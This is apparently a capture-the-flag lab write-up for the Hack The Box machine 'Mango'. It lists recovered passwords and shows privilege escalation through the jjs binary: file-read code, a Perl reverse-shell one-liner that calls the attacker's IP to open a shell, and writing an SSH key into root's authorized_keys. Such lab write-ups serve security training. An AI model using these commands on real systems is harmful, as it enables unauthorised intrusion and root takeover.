# Mango

IP: `10.10.10.162`

NoSQL injection vulnerability

Using a custom script:

```sh
Username: admin
Password: t9KcS3>!0B#2

Username: mango
Password: h3mXK8RhU~f{]f5H
```

Sshing with admin doesn't work, but 
sshing with mango's username and password works.

Once in and running linpeas, we see that jjs is exploitable but we can't run it. Checking the permissions of the file reveals that only admin can run it.

trying to switch user to admin works with admin's password.

## Priv esc

**File reads:**

```sh
echo 'var BufferedReader = Java.type("java.io.BufferedReader");
var FileReader = Java.type("java.io.FileReader");
var br = new BufferedReader(new FileReader("/var/log/syslog"));
while ((line = br.readLine()) != null) { print(line); }' | jjs
```

**File write:**

Create a script:

```sh
perl -e 'use Socket;$i="10.10.14.21";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

ssh-keygen

write public key to file `/root/.ssh/authorized_keys`:

```sh
echo 'var FileWriter = Java.type("java.io.FileWriter");
var fw = new FileWriter("/root/.ssh/authorized_keys");
fw.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBsCUE9ZPdL0DPy2+mWekUIzFMnjmpR+2Kprk0uE4f0AfTuKiZ+EMlUfYsrbJiZLRDH86/5jWzcjmj/PKH1bnTdI9gjJPFebovpynUUjmblLaFn1U0ZGcUQ2/b/EIsGtB1Q4/I2SIupF683bZunla3qt04TXf9xB8CH5ofkUYqa9ITRt6Om83AB+5XZU+Ej8MBVYcc1Cxgzv0xeps8rXQj4NThudjlifxdqGXnErY9jid4g5FrBL3U7PXCoF+YEUQbirYYXUb1rVYU0btLPPHlF2c/2eA3ef2/SyX/6awTPiW9OkCJMaySQj1HIlmdbiVpDe7+V9hQ6S7gF8lHEb3lZq2D4wDh1Fxzfxo31t4rKxtWfuEVf+UQhzilNY3uXoOTcT+FK3uBkKy+dhTS8w9hv9GB5/+fXn5W2h29Z+U5UYE/AkVnwmVkRZ1uuG1qOYTy1uUTgtQTnOuH2bIvvpIEDCVc61zj2CUjX9u26lHuoeH0HKlM45qgGdssd6maMnk=");
fw.close();' | jjs
```

now ssh with the private key:

```sh
ssh -i private_key root@10.10.10.162
```

and we get root.